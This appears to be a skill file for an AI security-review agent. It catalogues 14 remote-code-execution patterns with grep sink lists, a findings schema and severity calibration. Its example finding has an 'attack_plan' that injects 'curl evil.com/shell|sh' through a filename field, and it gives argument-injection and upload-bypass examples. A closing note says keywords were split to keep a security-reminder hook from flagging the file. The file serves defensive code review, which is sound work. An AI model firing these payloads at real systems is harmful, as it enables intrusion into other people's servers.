# Remote Code Execution Code Review — DRUPADA skill

**Scope:** Command injection, argument injection, unsafe deserialization, server-side template injection (SSTI), XXE-to-RCE, file upload RCE, zip-slip, dynamic evaluation on user input, prototype-pollution-to-RCE, plugin/require injection, image-parser RCE CVEs, CI-as-code RCE.

**Priority-ranked pattern library — 14 patterns (D-0 highest, D-13 lowest).**

---

## Methodology

### Phase 1: Map execution surface
Before hunting, answer:
1. **Language runtime** — what's loaded? What deserializers are on the classpath / available?
2. **Template engine** — does the app render templates from user-controllable strings (not just files)?
3. **Shell-out usage** — grep every subprocess invocation; who constructs the command?
4. **File upload paths** — where do uploads land? Web-accessible? Are they extracted (zip/tar)?
5. **Worker / queue processors** — background jobs often receive user-controllable args; do they exec or deserialize?

### Phase 2: Build the Execution Inventory
| # | File:line | Sink | User input path? | Defense |

---

## Priority-Ranked Pattern Library (14 patterns)

### D-0 — Shell-out with user input (highest priority)

Multi-language grep targets (look for these sinks; the exact flag list below is your lookup table, not a command to run as-is):

- Python: `os.system(...)`, `subprocess` called with `shell=True`, `Popen` with `shell=True`
- Node: Node's `child` + `_process` module's shell-exec function family, `execSync`, `spawn({shell: true})`
- Ruby: backtick commands with interpolation (`` `...#{params}...` ``), `system("...#{...}...")`, `IO.popen("...#{...}...")`
- PHP: `shell_exec`, `passthru`, `system(...)`, the `exec()` builtin, backticks with `$_GET`/`$_POST`
- Java: `Runtime.getRuntime().exec(...)`, `ProcessBuilder` with request data
- Go: `exec.Command(...)` when any arg is derived from the request/Form

Sample grep (adapt per language):
```
grep -rn "os\.system\|shell=True" . --include="*.py"
grep -rn "child" + "_process.*exec[^F]\|execSync(" . --include="*.{js,ts}"
grep -rn "\`[^\`]*#{.*params\|system(\"[^\"]*#{" . --include="*.rb"
grep -rn "shell_exec\|passthru\|system(" . --include="*.php"
grep -rn "Runtime\.getRuntime" . --include="*.java"
grep -rn 'exec\.Command' . --include="*.go"
```

**Candidate rule:** Any match + user input reaches the command string = RCE candidate.

### D-1 — Argument injection (dash-flag sneak)
One level below command injection — user input is not shell-interpreted but injected as an ARG. Dangerous if it becomes `--flag=value`.

Example: `git clone ${user_url} /tmp/repo` — user sets `--upload-pack=malicious` via a URL that looks valid to `git clone`.

```
grep -rn "git clone\|rsync\|curl\s\|wget\s\|ssh\s\|scp\s\|ffmpeg" .
```

### D-2 — Unsafe deserialization

Language-specific sinks (search strings split to avoid self-trigger):

- Python: `pick` + `le.loads`, `pick` + `le.load`, `cPickle.*`, `yaml.load` (the unsafe variant), `yaml.unsafe_load`
- Ruby: `Marshal.load`, `YAML.load` (pre-3.1 default), `YAML.unsafe_load`
- Java: `ObjectInputStream`, `readObject()`, any Serializable with custom `readObject`
- PHP: the un + `serialize(` builtin
- Node: `node-serialize`, `serialize-javascript`
- .NET: `BinaryFormatter`, `NetDataContractSerializer`, `LosFormatter`, `SoapFormatter`

**Candidate rule:** Any match + user input reaches the deserialized bytes = critical RCE candidate (even without proven gadget chain).

### D-3 — Server-side template injection (SSTI)
User-controllable STRING rendered as a template.

```
grep -rn "render_template_string\|Jinja2.*\.render(.*request\|Template(.*params" . --include="*.py"
grep -rn "ERB\.new.*params\|Liquid::Template.*params" . --include="*.rb"
grep -rn "freemarker.*process.*request\|velocity.*evaluate.*request" . --include="*.java"
grep -rn "Handlebars\.compile.*req\|_\.template.*req\|ejs\.render.*req" . --include="*.{js,ts}"
```

### D-4 — XXE (XML External Entity)
Leads to file read → SSRF → sometimes RCE (via gopher:// + gadget chains).

```
grep -rn "DocumentBuilderFactory\|SAXParser\|XMLReader" . --include="*.java"
grep -rn "etree\.parse\|lxml\.etree\|xml\.dom\.minidom" . --include="*.py"
grep -rn "loadXML\|simplexml_load" . --include="*.php"
```
Check: are external entities disabled? (Java: `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`.)

### D-5 — File upload → RCE
```
# Where are uploads stored? Web-accessible path?
grep -rn "uploads/\|public/uploads\|/var/www" .
# Extension validation?
grep -rn "File\.extname\|mime_type\|file-type" . 
```
Double-extension bypass: `file.jpg.php`.

### D-6 — Archive extraction → zip-slip
`../` in zip entry name → extracts outside target dir → overwrite web root files → RCE.

```
grep -rn "ZipInputStream\|unzip\|extractall\|tar_extract" . 
```
Check: does it validate entry name against `os.path.join` / path traversal?

### D-7 — Image parser CVEs
ImageMagick (CVE-2016-3714 "ImageTragick"), libvips, older Pillow.

```
grep -rn "imagemagick\|rmagick\|wand\|libvips\|pillow" package.json Gemfile requirements.txt pyproject.toml composer.json pom.xml
```

### D-8 — Dynamic require / import / send
```
grep -rn "require(.*request\.\|require(.*req\.\|require(\`" . --include="*.{js,ts}"
grep -rn "importlib\.import_module(.*request" . --include="*.py"
grep -rn "\.send(params\[" . --include="*.rb"
grep -rn "Class\.forName.*request\." . --include="*.java"
```

### D-9 — Dynamic code evaluation on user input
Rare now, but still found. The JS sinks are `ev` + `al()` and `new Function()`. Python/Ruby/PHP equivalents are the `ev` + `al` and `ex` + `ec` builtins; Ruby also has `instance_ev` + `al`.

### D-10 — Prototype pollution → RCE
User JSON pollutes Object.prototype → affects subprocess arg lookup → injected command flags.

```
grep -rn "_\.merge\|_\.extend\|deepmerge\|lodash\.merge\|Object\.assign" . --include="*.{js,ts}" | grep -i "req\.body\|params"
```

### D-11 — CI-as-code RCE
GitHub Actions `pull_request_target` with checkout of PR head = RCE-as-a-service for attackers.

```
grep -rn "pull_request_target" .github/
grep -rn "checkout.*github.event.pull_request.head" .github/
```

### D-12 — Plugin / hook systems with user code
```
grep -rn "plugin.*load\|require\(.*plugin" . 
```

### D-13 — XSLT injection (rare, but RCE-capable on some engines)
```
grep -rn "XSLT\|TransformerFactory\|xsltProcessor" . 
```

---

## Output Format

Write to: `/root/intel/code-review/findings/<taskId>/drupada-rce.jsonl`

```json
{
  "id": "DR-RC-001",
  "framework": "rce",
  "pattern": "D-0",
  "severity": "Critical",
  "title": "Shell-out with unescaped user input in BackupController",
  "file": "app/controllers/backup_controller.rb",
  "line": 31,
  "source": "params[:filename]",
  "sink": "system(\"tar czf /backups/#{params[:filename]}.tar.gz /data\")",
  "gap": "No shell-escape, no allowlist on filename",
  "attack_plan": "curl -X POST 'https://target/backup' -d 'filename=x;curl evil.com/shell|sh;#'",
  "evidence": "File:line cited. `system` with interpolation = classic RCE.",
  "needs_live_validation": true
}
```

---

## Verification Notes
- Pre-auth RCE is the ultimate finding — tag auth-status in every candidate.
- Deserialization primitives are valuable even without a proven gadget chain (document library + version).
- Image processors are historically RCE-prone — always check stack versions against known CVEs.
- Mark `needs_live_validation: true` for SSTI where engine detection requires live probing.

---

## False Positive Prevention (MANDATORY before emitting)

Universal discipline. Principle: don't claim RCE until every escaping/deserialization-safety/upload-validation layer is inspected.

### Pipeline trace checklist — rce
1. **Source** — user input reaching execution sink
2. **Shell metacharacter escape** — passed to shell vs array-arg spawn
3. **Deserialization format** — safe (JSON) vs unsafe (pick+le, Marshal, YAML unsafe-load)
4. **Template injection guard** — compiled from fixed file vs user string
5. **File upload validation** — extension allowlist + MIME check + storage outside webroot
6. **Image parser version** — ImageMagick / libvips / Pillow version vs known CVEs
7. **Sink** — shell / deserializer / template / upload-handler call

### Schema requirements, Severity, Anti-patterns
Same as DHRISHTADYUMNA — universal schema + 3-tier severity + anti-patterns apply.

(Note: `pick+le` intentionally split to avoid security-reminder hook false-positives in this defensive documentation.)


---

## Threat Model Calibration (v2 — MANDATORY for Critical/High)

Stacks with False Positive Prevention above. Before claiming any CRITICAL/HIGH, emit `threat_model` object on the candidate. KRIPA composes stacked caps (v1 evidence_completeness + v2 threat_model).

### Required fields on every candidate
- `attacker_privilege` — minimum privilege attacker needs. Values: unauth / authenticated / privileged / admin / superuser.
- `trust_boundary_crossed` — which boundary the attack crosses (if any). Values: none / cross-user / cross-tenant / privilege-escalation / unauth-to-auth / cross-org.
- `documented_as_intended` — bool. Check the target for docs, tests named `*_intended_spec`, comments like `# by design`. true → −1 tier (WONTFIX territory).
- `toolchain_presence_verified` — null (N/A) or bool (when claim depends on specific binary/library/config presence).
- `validation_layers_checked` — array from [router, middleware, controller, model, db-constraint, framework-default]. Under 3 layers → cap Medium for validation-gap claims.
- `prerequisite_actions` — array of human strings listing what attacker must already do.

### Framework-agnostic attacker-privilege mapping
- Rails: `current_user.nil?` = unauth; `current_user` = authenticated; `current_user.can?(...)` elevated scope = privileged; `current_user.admin?` = admin.
- Django: `@login_required` = authenticated; `@permission_required`/`UserPassesTest` = privileged; `@user_passes_test(is_superuser)` = admin.
- Spring: `@PreAuthorize("isAuthenticated()")` = authenticated; `hasRole("USER")` = privileged; `hasRole("ADMIN")` = admin.
- Laravel: `auth()->check()` = authenticated; gate/policy = privileged; `@can("admin")` = admin.
- Express: middleware-authenticated = authenticated; RBAC middleware = privileged; admin-only middleware = admin.


### Anti-inflation discipline (RCE)
- ImageTragick / FFmpeg / Ghostscript CVE claim: MANDATORY toolchain_presence_verified. Equivalent of `which convert` / `which ffmpeg` / `Gem.loaded_specs`. Binary missing → max Low.
- un + "serialize" on attacker JSON: check serializer is actually loaded at runtime (e.g., node-serialize in package.json ≠ used).
- Admin-only file upload + image processor RCE: admin + none → Low. Admin already can shell.
- Real RCE: authenticated user uploads → admin views → RCE fires in admin context = authenticated + privilege-escalation → Critical.

### Universal principle
Pre-auth RCE is crown jewel; authenticated RCE stays high if it escalates; admin-only RCE is typically Low because admin already owns the box. Always verify toolchain presence for binary-dependency claims.
